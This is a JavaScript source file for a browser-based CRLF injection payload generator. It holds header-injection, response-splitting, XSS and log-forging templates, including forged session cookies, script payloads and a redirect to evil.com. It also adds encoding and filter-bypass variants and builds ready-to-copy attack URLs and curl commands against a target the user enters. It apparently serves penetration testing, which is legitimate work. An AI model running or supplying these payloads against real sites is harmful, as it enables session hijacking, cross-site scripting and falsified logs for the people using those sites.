/**
 * CRLF Injection Tester
 * 
 * This script generates various CRLF injection payloads for testing
 * HTTP header injection, response splitting, and log injection vulnerabilities.
 */

// DOM elements
const targetUrl = document.getElementById('target-url');
const parameterName = document.getElementById('parameter-name');
const customPayload = document.getElementById('custom-payload');
const generateBtn = document.getElementById('generate-btn');
const copyAllBtn = document.getElementById('copy-all-btn');
const clearBtn = document.getElementById('clear-btn');
const payloadsOutput = document.getElementById('payloads-output');
const urlsOutput = document.getElementById('urls-output');
const curlOutput = document.getElementById('curl-output');
const payloadStats = document.getElementById('payload-stats');
const totalCount = document.getElementById('total-count');
const attackTypes = document.getElementById('attack-types');
const encodingVariants = document.getElementById('encoding-variants');
const currentYearElement = document.getElementById('current-year');
const tabButtons = document.querySelectorAll('.tab-btn');
const tabPanes = document.querySelectorAll('.tab-pane');

// Set current year in footer
currentYearElement.textContent = new Date().getFullYear();

// CRLF payload templates
const payloadTemplates = {
    headerInjection: [
        'Set-Cookie: admin=true',
        'Set-Cookie: session=hijacked',
        'X-Forwarded-For: 127.0.0.1',
        'X-Real-IP: 127.0.0.1',
        'Authorization: Bearer admin-token',
        'User-Agent: <script>alert("XSS")</script>',
        'Referer: javascript:alert("XSS")',
        'X-Custom-Header: injected'
    ],
    responseSplitting: [
        '<script>alert("CRLF-XSS")</script>',
        '<img src=x onerror=alert("CRLF")>',
        '<h1>Response Split Successful</h1>',
        '<meta http-equiv="refresh" content="0;url=https://evil.com">',
        'HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Split</h1>',
        '<iframe src="javascript:alert(\'CRLF\')"></iframe>'
    ],
    logInjection: [
        'Admin logged in successfully from 127.0.0.1',
        'Failed login attempt blocked',
        'Security alert: Multiple failed attempts',
        'User admin created with privileges',
        'Password changed for user admin',
        'System backup completed successfully'
    ],
    xssHeaders: [
        'X-XSS-Protection: 0',
        'Content-Security-Policy: default-src *',
        'X-Frame-Options: ALLOWALL',
        'Content-Type: text/html',
        'Access-Control-Allow-Origin: *'
    ]
};

// CRLF encoding variations
const crlfVariations = [
    '\\r\\n',     // Standard CRLF
    '\\n',        // LF only
    '\\r',        // CR only
    '\\r\\n\\r\\n', // Double CRLF
    '\\n\\r',     // Reversed
    '\\r\\n\\t',  // CRLF + Tab
    '\\r\\n ',    // CRLF + Space
];

// Encoding functions
const encodingMethods = {
    urlEncode: (str) => encodeURIComponent(str),
    doubleUrlEncode: (str) => encodeURIComponent(encodeURIComponent(str)),
    unicodeEncode: (str) => str.replace(/\\r/g, '\\u000d').replace(/\\n/g, '\\u000a'),
    mixedEncode: (str) => {
        return str.replace(/\\r/g, '%0d').replace(/\\n/g, '\\u000a');
    }
};

// Bypass techniques
const bypassTechniques = {
    spaceVariations: ['%20', '+', '%09', '%0b', '%0c'],
    nullBytes: ['%00', '\\x00', '\\u0000'],
    caseVariations: (str) => [str.toLowerCase(), str.toUpperCase()],
    tabVariations: ['%09', '\\t', '\\x09']
};

/**
 * Generate base CRLF payloads
 */
function generateBaseCRLFPayloads() {
    const payloads = [];
    const selectedTypes = getSelectedAttackTypes();
    
    selectedTypes.forEach(type => {
        if (payloadTemplates[type]) {
            payloadTemplates[type].forEach(template => {
                crlfVariations.forEach(crlf => {
                    const payload = crlf + template;
                    payloads.push({
                        type: type,
                        payload: payload,
                        description: `${type.replace(/([A-Z])/g, ' $1').toLowerCase()} - ${template.substring(0, 30)}...`
                    });
                });
            });
        }
    });

    // Add custom payload if provided
    const custom = customPayload.value.trim();
    if (custom) {
        crlfVariations.forEach(crlf => {
            payloads.push({
                type: 'custom',
                payload: crlf + custom,
                description: `custom payload - ${custom.substring(0, 30)}...`
            });
        });
    }

    return payloads;
}

/**
 * Apply encoding variations to payloads
 */
function applyEncodingVariations(payloads) {
    const encodedPayloads = [];
    const selectedEncodings = getSelectedEncodings();

    payloads.forEach(payloadObj => {
        // Add original payload
        encodedPayloads.push({
            ...payloadObj,
            encoding: 'none'
        });

        // Apply selected encodings
        selectedEncodings.forEach(encoding => {
            if (encodingMethods[encoding]) {
                const encoded = encodingMethods[encoding](payloadObj.payload);
                encodedPayloads.push({
                    ...payloadObj,
                    payload: encoded,
                    encoding: encoding
                });
            }
        });
    });

    return encodedPayloads;
}

/**
 * Apply bypass techniques
 */
function applyBypassTechniques(payloads) {
    const bypassPayloads = [...payloads];
    const selectedBypasses = getSelectedBypasses();

    if (selectedBypasses.includes('spaceVariations')) {
        payloads.forEach(payloadObj => {
            bypassTechniques.spaceVariations.forEach(space => {
                const modified = payloadObj.payload.replace(/ /g, space);
                if (modified !== payloadObj.payload) {
                    bypassPayloads.push({
                        ...payloadObj,
                        payload: modified,
                        bypass: 'space variation'
                    });
                }
            });
        });
    }

    if (selectedBypasses.includes('nullBytes')) {
        payloads.forEach(payloadObj => {
            bypassTechniques.nullBytes.forEach(nullByte => {
                bypassPayloads.push({
                    ...payloadObj,
                    payload: payloadObj.payload + nullByte,
                    bypass: 'null byte'
                });
            });
        });
    }

    if (selectedBypasses.includes('caseVariations')) {
        payloads.forEach(payloadObj => {
            const caseVariations = bypassTechniques.caseVariations(payloadObj.payload);
            caseVariations.forEach((variation, index) => {
                if (variation !== payloadObj.payload) {
                    bypassPayloads.push({
                        ...payloadObj,
                        payload: variation,
                        bypass: index === 0 ? 'lowercase' : 'uppercase'
                    });
                }
            });
        });
    }

    if (selectedBypasses.includes('tabVariations')) {
        payloads.forEach(payloadObj => {
            bypassTechniques.tabVariations.forEach(tab => {
                const modified = payloadObj.payload.replace(/\\t/g, tab);
                if (modified !== payloadObj.payload) {
                    bypassPayloads.push({
                        ...payloadObj,
                        payload: modified,
                        bypass: 'tab variation'
                    });
                }
            });
        });
    }

    return bypassPayloads;
}

/**
 * Get selected attack types
 */
function getSelectedAttackTypes() {
    const types = [];
    if (document.getElementById('header-injection').checked) types.push('headerInjection');
    if (document.getElementById('response-splitting').checked) types.push('responseSplitting');
    if (document.getElementById('log-injection').checked) types.push('logInjection');
    if (document.getElementById('xss-injection').checked) types.push('xssHeaders');
    return types;
}

/**
 * Get selected encoding methods
 */
function getSelectedEncodings() {
    const encodings = [];
    if (document.getElementById('url-encode').checked) encodings.push('urlEncode');
    if (document.getElementById('double-encode').checked) encodings.push('doubleUrlEncode');
    if (document.getElementById('unicode-encode').checked) encodings.push('unicodeEncode');
    if (document.getElementById('mixed-encode').checked) encodings.push('mixedEncode');
    return encodings;
}

/**
 * Get selected bypass techniques
 */
function getSelectedBypasses() {
    const bypasses = [];
    if (document.getElementById('space-variations').checked) bypasses.push('spaceVariations');
    if (document.getElementById('null-bytes').checked) bypasses.push('nullBytes');
    if (document.getElementById('case-variations').checked) bypasses.push('caseVariations');
    if (document.getElementById('tab-variations').checked) bypasses.push('tabVariations');
    return bypasses;
}

/**
 * Generate all CRLF payloads
 */
function generateAllPayloads() {
    const selectedTypes = getSelectedAttackTypes();
    if (selectedTypes.length === 0) {
        showNotification('Please select at least one attack type', 'warning');
        return [];
    }

    let payloads = generateBaseCRLFPayloads();
    payloads = applyEncodingVariations(payloads);
    payloads = applyBypassTechniques(payloads);

    return payloads;
}

/**
 * Display payloads in the output
 */
function displayPayloads(payloads) {
    if (payloads.length === 0) {
        payloadsOutput.innerHTML = '<p class="placeholder">No payloads generated. Please select attack types and try again.</p>';
        return;
    }

    let html = '<div class="payloads-list">';
    
    payloads.forEach((payloadObj, index) => {
        const tags = [];
        if (payloadObj.encoding && payloadObj.encoding !== 'none') tags.push(payloadObj.encoding);
        if (payloadObj.bypass) tags.push(payloadObj.bypass);
        
        html += `
            <div class="payload-item" data-type="${payloadObj.type}">
                <div class="payload-header">
                    <span class="payload-index">#${index + 1}</span>
                    <span class="payload-type">${payloadObj.type.replace(/([A-Z])/g, ' $1').toLowerCase()}</span>
                    ${tags.length > 0 ? '<div class="payload-tags">' + tags.map(tag => `<span class="tag">${tag}</span>`).join('') + '</div>' : ''}
                </div>
                <div class="payload-content">
                    <code class="payload-code">${escapeHtml(payloadObj.payload)}</code>
                    <button class="copy-btn" onclick="copyPayload('${escapeForJs(payloadObj.payload)}', this)" title="Copy payload">Copy</button>
                </div>
                <div class="payload-description">${payloadObj.description}</div>
            </div>
        `;
    });
    
    html += '</div>';
    payloadsOutput.innerHTML = html;
}

/**
 * Generate test URLs
 */
function generateTestUrls(payloads) {
    const baseUrl = targetUrl.value.trim();
    const param = parameterName.value.trim() || 'url';
    
    if (!baseUrl) {
        urlsOutput.innerHTML = '<p class="placeholder">Please enter a target URL to generate test URLs</p>';
        return;
    }

    let html = '<div class="urls-list">';
    
    payloads.forEach((payloadObj, index) => {
        const separator = baseUrl.includes('?') ? '&' : '?';
        const testUrl = `${baseUrl}${separator}${param}=${payloadObj.payload}`;
        
        html += `
            <div class="url-item">
                <div class="url-header">
                    <span class="url-index">#${index + 1}</span>
                    <span class="url-type">${payloadObj.type.replace(/([A-Z])/g, ' $1').toLowerCase()}</span>
                </div>
                <div class="url-content">
                    <code class="url-code">${escapeHtml(testUrl)}</code>
                    <button class="copy-btn" onclick="copyPayload('${escapeForJs(testUrl)}', this)" title="Copy URL">Copy</button>
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    urlsOutput.innerHTML = html;
}

/**
 * Generate cURL commands
 */
function generateCurlCommands(payloads) {
    const baseUrl = targetUrl.value.trim();
    const param = parameterName.value.trim() || 'url';
    
    if (!baseUrl) {
        curlOutput.innerHTML = '<p class="placeholder">Please enter a target URL to generate cURL commands</p>';
        return;
    }

    let html = '<div class="curl-list">';
    
    payloads.forEach((payloadObj, index) => {
        const separator = baseUrl.includes('?') ? '&' : '?';
        const testUrl = `${baseUrl}${separator}${param}=${payloadObj.payload}`;
        const curlCommand = `curl -i -s -k -X GET "${testUrl}"`;
        
        html += `
            <div class="curl-item">
                <div class="curl-header">
                    <span class="curl-index">#${index + 1}</span>
                    <span class="curl-type">${payloadObj.type.replace(/([A-Z])/g, ' $1').toLowerCase()}</span>
                </div>
                <div class="curl-content">
                    <code class="curl-code">${escapeHtml(curlCommand)}</code>
                    <button class="copy-btn" onclick="copyPayload('${escapeForJs(curlCommand)}', this)" title="Copy cURL command">Copy</button>
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    curlOutput.innerHTML = html;
}

/**
 * Update statistics
 */
function updateStats(payloads) {
    const types = new Set(payloads.map(p => p.type));
    const encodings = new Set(payloads.map(p => p.encoding).filter(e => e && e !== 'none'));
    
    totalCount.textContent = payloads.length;
    attackTypes.textContent = types.size;
    encodingVariants.textContent = encodings.size;
    
    payloadStats.style.display = payloads.length > 0 ? 'flex' : 'none';
}

/**
 * Copy payload to clipboard
 */
async function copyPayload(text, button) {
    try {
        await navigator.clipboard.writeText(text);
        const originalText = button.textContent;
        button.textContent = 'Copied';
        button.style.background = 'var(--success-color)';
        
        setTimeout(() => {
            button.textContent = originalText;
            button.style.background = '';
        }, 1500);
        
        showNotification('Copied to clipboard!', 'success');
    } catch (error) {
        showNotification('Failed to copy to clipboard', 'error');
    }
}

/**
 * Copy all payloads
 */
async function copyAllPayloads() {
    const payloadElements = document.querySelectorAll('.payload-code');
    if (payloadElements.length === 0) {
        showNotification('No payloads to copy', 'warning');
        return;
    }
    
    const allPayloads = Array.from(payloadElements).map(el => el.textContent).join('\\n');
    
    try {
        await navigator.clipboard.writeText(allPayloads);
        showNotification(`Copied ${payloadElements.length} payloads to clipboard!`, 'success');
    } catch (error) {
        showNotification('Failed to copy payloads', 'error');
    }
}

/**
 * Clear all outputs
 */
function clearOutputs() {
    payloadsOutput.innerHTML = '<p class="placeholder">Click "Generate Payloads" to see the results</p>';
    urlsOutput.innerHTML = '<p class="placeholder">Generate payloads first to see complete test URLs</p>';
    curlOutput.innerHTML = '<p class="placeholder">Generate payloads first to see cURL commands</p>';
    payloadStats.style.display = 'none';
    showNotification('Outputs cleared', 'info');
}

/**
 * Show notification
 */
function showNotification(message, type = 'success') {
    const existingNotification = document.querySelector('.notification');
    if (existingNotification) {
        existingNotification.remove();
    }

    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    document.body.appendChild(notification);

    setTimeout(() => {
        notification.classList.add('show');
    }, 10);

    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => notification.remove(), 300);
    }, 3000);
}

/**
 * Escape HTML for safe display
 */
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

/**
 * Escape text for JavaScript strings
 */
function escapeForJs(text) {
    return text.replace(/'/g, "\\\\'").replace(/"/g, '\\\\"').replace(/\\\\/g, '\\\\\\\\');
}

// Event Listeners
generateBtn.addEventListener('click', () => {
    const payloads = generateAllPayloads();
    if (payloads.length > 0) {
        displayPayloads(payloads);
        generateTestUrls(payloads);
        generateCurlCommands(payloads);
        updateStats(payloads);
        showNotification(`Generated ${payloads.length} CRLF payloads!`, 'success');
    }
});

copyAllBtn.addEventListener('click', copyAllPayloads);
clearBtn.addEventListener('click', clearOutputs);

// Tab functionality
tabButtons.forEach(button => {
    button.addEventListener('click', () => {
        tabButtons.forEach(btn => btn.classList.remove('active'));
        tabPanes.forEach(pane => pane.classList.remove('active'));

        button.classList.add('active');
        const tabId = button.getAttribute('data-tab');
        document.getElementById(`${tabId}-tab`).classList.add('active');
    });
});

// Auto-generate on configuration change
const configInputs = document.querySelectorAll('input[type="checkbox"], input[type="text"]');
configInputs.forEach(input => {
    input.addEventListener('change', () => {
        if (payloadsOutput.innerHTML.includes('payload-item')) {
            // Re-generate if payloads are already displayed
            generateBtn.click();
        }
    });
});

// Initialize with example URL
window.addEventListener('load', () => {
    if (!targetUrl.value) {
        targetUrl.value = 'https://example.com/redirect';
    }
});

// Make copyPayload function globally available
window.copyPayload = copyPayload;
